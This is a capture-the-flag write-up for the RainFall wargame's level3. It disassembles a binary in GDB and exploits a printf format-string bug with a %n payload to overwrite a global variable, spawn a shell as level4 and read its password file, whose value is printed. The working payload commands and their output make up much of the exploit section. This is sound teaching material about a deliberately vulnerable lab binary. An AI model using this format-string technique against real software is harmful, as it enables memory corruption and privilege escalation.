[README](../README.md)
# level3

## GDB Disassembly
### Main
```
0x0804851a <+0>:	push   %ebp
0x0804851b <+1>:	mov    %esp,%ebp
0x0804851d <+3>:	and    $0xfffffff0,%esp
0x08048520 <+6>:	call   0x80484a4 <v>
0x08048525 <+11>:	leave  
0x08048526 <+12>:	ret  
```

Function prologue and then call the function v.

### Function v
```
0x080484a4 <+0>:	push   %ebp
0x080484a5 <+1>:	mov    %esp,%ebp
0x080484a7 <+3>:	sub    $0x218,%esp
0x080484ad <+9>:	mov    0x8049860,%eax
0x080484b2 <+14>:	mov    %eax,0x8(%esp)
0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
0x080484be <+26>:	lea    -0x208(%ebp),%eax
0x080484c4 <+32>:	mov    %eax,(%esp)
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
0x080484cc <+40>:	lea    -0x208(%ebp),%eax
0x080484d2 <+46>:	mov    %eax,(%esp)
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
0x080484da <+54>:	mov    0x804988c,%eax
0x080484df <+59>:	cmp    $0x40,%eax
0x080484e2 <+62>:	jne    0x8048518 <v+116>
0x080484e4 <+64>:	mov    0x8049880,%eax
0x080484e9 <+69>:	mov    %eax,%edx
0x080484eb <+71>:	mov    $0x8048600,%eax
0x080484f0 <+76>:	mov    %edx,0xc(%esp)
0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
0x080484fc <+88>:	movl   $0x1,0x4(%esp)
0x08048504 <+96>:	mov    %eax,(%esp)
0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:	movl   $0x804860d,(%esp)
0x08048513 <+111>:	call   0x80483c0 <system@plt>
0x08048518 <+116>:	leave  
0x08048519 <+117>:	ret  
```

- Reads input from the user using `fgets`
- Print the input using printf
- Compare the value stored in `0x804988c` to the value `$0x40`
- if the comparison is equal the program execute a `system` call
- otherwise exit

#### Global variable
```
(gdb) info variables
    0x0804988c  m
(gdb) x/d 0x804988c
    0x804988c <m>:	0
```

## Exploit
We need to find a way to overwrite the value of the variable `m` located at `0x804988c`.
It may be possible to exploit format string vulnerabilities in the `printf` call to overwrite memory.

If we try to input format specifiers in the program, we can see that the input is not properly sanytized.
The program prints the values currently on the stack.
```
level3@RainFall:~$ ./level3
%x %x %x
200 b7fd1ac0 b7ff37d0
```


**`%n` format specificer:**
The %n format specifier in printf does not output anything itself. Instead, it writes the number of characters printed so far to a memory location specified by an argument.
```
printf("%n", &integer_variable);
```
- `%n``: Format specifier to write the number of characters printed so far.
- `&integer_variable`: Pointer to an integer variable where the count of characters printed so far will be written.

**Writing the variable `m`:**
We need to edit the value stored at `0x804988c` with a value of `0x40` = `64` in decimal

- Memory location: `"\x8c\x98\x04\x08"`

We try to input the adress of `m` and print the addresses of the stack using `%x` format.
We see that the address lands on the 4th byte
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x %x %x %x"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit | ./level3 
� 200 b7fd1ac0 b7ff37d0 804988c 20782520 25207825 78252078
```

**Crafting the payload:**
We need to write a total of 64 bytes and use the `%n` format to output to the variable `m`

`%n` will write the size of our input at the address pointed by `%n`. For example, the following input : `AAAA%n`, means that we will write the value 4 (because the size of “AAAA” equals 4) at the address pointed by %n.
- We can specify a postion to read/write on the stack with `%<num>$n`

```
\x8c\x98\x04\x08   AAAAAAAA...AAAA    %4$n
|----------------|------------------|
    Address of        Padding        Format Specifier
    variable m
```

```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3 
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Ressources
[OWASP - format string attack](https://owasp.org/www-community/attacks/Format_string_attack)
[Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)
